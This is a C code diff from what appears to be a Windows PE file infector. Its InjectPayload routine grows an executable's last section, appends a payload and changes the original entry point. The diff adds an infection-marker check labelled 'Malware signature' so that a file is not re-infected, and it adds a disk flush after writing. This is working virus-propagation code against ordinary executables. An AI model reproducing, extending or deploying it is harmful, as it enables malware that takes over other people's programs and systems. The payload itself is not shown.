@@ -8,16 +8,17 @@ EXTERN_C_START
 extern CONST VOID payload();
 extern LONGLONG delta_start;
 extern LONGLONG to_c_code;
+extern CONST DWORD signature;
 extern DWORD code_size;
 EXTERN_C_END
 
 VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPayload,
                    IN CONST DWORD dwPayloadSize) {
     PIMAGE_NT_HEADERS64 pNtHeader;
-    WORD wNbSections;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
+    WORD wNbSections;
     DWORD dwFileAlignment, dwLastSectionPtr, dwLastSectionSize, dwPayloadPtr, dwOrigEntryPoint,
-        dwNewEntryPoint;
+        dwNewEntryPoint, dwSignature;
 
     pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
     wNbSections = pNtHeader->FileHeader.NumberOfSections;
@@ -37,6 +38,15 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     printf("Last section virtsize: %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
            pLastSection->Misc.VirtualSize);
     printf("Size of code: %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
+
+    dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwPayloadPtr -
+                             ((PCBYTE)&code_size - (PCBYTE)&signature + sizeof(code_size)));
+    printf("\nMalware signature: %#010lx\n\n", dwSignature);
+
+    if (dwSignature == signature) {
+        printf("Payload already injected!\n");
+        return;
+    }
 
     pLastSection->Misc.VirtualSize += dwPayloadSize;
     // DWORD dwNewSize = PAGE_ALIGN(pLastSection->Misc.VirtualSize, dwFileAlignment);
@@ -127,6 +137,7 @@ int main(int argc, char* argv[]) {
 
     FlushViewOfFile(pMapAddress, 0);
     UnmapViewOfFile(pMapAddress);
+    FlushFileBuffers(hFile);
 close_map:
     CloseHandle(hMapFile);
 close_file:
